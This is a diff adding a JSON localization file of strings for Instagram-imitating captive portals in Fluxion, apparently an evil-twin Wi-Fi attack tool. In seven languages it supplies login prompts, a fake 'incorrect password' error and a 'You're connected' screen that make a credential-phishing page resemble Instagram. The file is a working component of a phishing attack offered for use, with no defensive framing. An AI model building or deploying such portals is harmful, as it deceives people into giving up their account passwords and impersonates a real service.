@@ -1,0 +1,131 @@
+{
+  "_comment": "Strings for the Instagram captive portals. 'code' becomes the directory suffix (Instagram_<code>.portal) and must follow Fluxion's language suffixes, which is why Turkish is 'tur' and not 'tr'.",
+  "languages": [
+    {
+      "code": "tur",
+      "html_lang": "tr",
+      "strings": {
+        "heading": "Instagram'a Giriş Yap",
+        "username_placeholder": "Cep telefonu numarası, kullanıcı adı veya e-posta adresi",
+        "password_placeholder": "Şifre",
+        "login_button": "Giriş Yap",
+        "forgot": "Şifreni mi unuttun?",
+        "facebook": "Facebook ile giriş yap",
+        "create": "Yeni hesap oluştur",
+        "error_message": "Şifren yanlış. Lütfen şifreni kontrol et ve tekrar dene.",
+        "connected_title": "Bağlandın",
+        "ssid_before": "Bu cihaz artık ",
+        "ssid_after": " ağına bağlı.",
+        "continue": "Devam et"
+      }
+    },
+    {
+      "code": "en",
+      "html_lang": "en",
+      "strings": {
+        "heading": "Log in to Instagram",
+        "username_placeholder": "Mobile number, username or email address",
+        "password_placeholder": "Password",
+        "login_button": "Log in",
+        "forgot": "Forgot password?",
+        "facebook": "Log in with Facebook",
+        "create": "Create new account",
+        "error_message": "Your password was incorrect. Please double-check your password.",
+        "connected_title": "You're connected",
+        "ssid_before": "This device now has access to ",
+        "ssid_after": ".",
+        "continue": "Continue"
+      }
+    },
+    {
+      "code": "de",
+      "html_lang": "de",
+      "strings": {
+        "heading": "Bei Instagram anmelden",
+        "username_placeholder": "Handynummer, Benutzername oder E-Mail-Adresse",
+        "password_placeholder": "Passwort",
+        "login_button": "Anmelden",
+        "forgot": "Passwort vergessen?",
+        "facebook": "Mit Facebook anmelden",
+        "create": "Neues Konto erstellen",
+        "error_message": "Dein Passwort war falsch. Bitte überprüfe dein Passwort.",
+        "connected_title": "Du bist verbunden",
+        "ssid_before": "Dieses Gerät hat jetzt Zugriff auf ",
+        "ssid_after": ".",
+        "continue": "Weiter"
+      }
+    },
+    {
+      "code": "es",
+      "html_lang": "es",
+      "strings": {
+        "heading": "Inicia sesión en Instagram",
+        "username_placeholder": "Número de móvil, nombre de usuario o correo electrónico",
+        "password_placeholder": "Contraseña",
+        "login_button": "Iniciar sesión",
+        "forgot": "¿Has olvidado la contraseña?",
+        "facebook": "Iniciar sesión con Facebook",
+        "create": "Crear cuenta nueva",
+        "error_message": "Tu contraseña era incorrecta. Compruébala e inténtalo de nuevo.",
+        "connected_title": "Estás conectado",
+        "ssid_before": "Este dispositivo ahora tiene acceso a ",
+        "ssid_after": ".",
+        "continue": "Continuar"
+      }
+    },
+    {
+      "code": "fr",
+      "html_lang": "fr",
+      "strings": {
+        "heading": "Connectez-vous à Instagram",
+        "username_placeholder": "Numéro de mobile, nom d'utilisateur ou adresse e-mail",
+        "password_placeholder": "Mot de passe",
+        "login_button": "Se connecter",
+        "forgot": "Mot de passe oublié ?",
+        "facebook": "Se connecter avec Facebook",
+        "create": "Créer un compte",
+        "error_message": "Votre mot de passe était incorrect. Veuillez le vérifier.",
+        "connected_title": "Vous êtes connecté",
+        "ssid_before": "Cet appareil a maintenant accès à ",
+        "ssid_after": ".",
+        "continue": "Continuer"
+      }
+    },
+    {
+      "code": "it",
+      "html_lang": "it",
+      "strings": {
+        "heading": "Accedi a Instagram",
+        "username_placeholder": "Numero di cellulare, nome utente o indirizzo email",
+        "password_placeholder": "Password",
+        "login_button": "Accedi",
+        "forgot": "Password dimenticata?",
+        "facebook": "Accedi con Facebook",
+        "create": "Crea nuovo account",
+        "error_message": "La password non è corretta. Controllala e riprova.",
+        "connected_title": "Sei connesso",
+        "ssid_before": "Questo dispositivo ora ha accesso a ",
+        "ssid_after": ".",
+        "continue": "Continua"
+      }
+    },
+    {
+      "code": "pt-br",
+      "html_lang": "pt-BR",
+      "strings": {
+        "heading": "Entrar no Instagram",
+        "username_placeholder": "Número de celular, nome de usuário ou e-mail",
+        "password_placeholder": "Senha",
+        "login_button": "Entrar",
+        "forgot": "Esqueceu a senha?",
+        "facebook": "Entrar com o Facebook",
+        "create": "Criar nova conta",
+        "error_message": "Sua senha estava incorreta. Verifique e tente novamente.",
+        "connected_title": "Você está conectado",
+        "ssid_before": "Este dispositivo agora tem acesso a ",
+        "ssid_after": ".",
+        "continue": "Continuar"
+      }
+    }
+  ]
+}
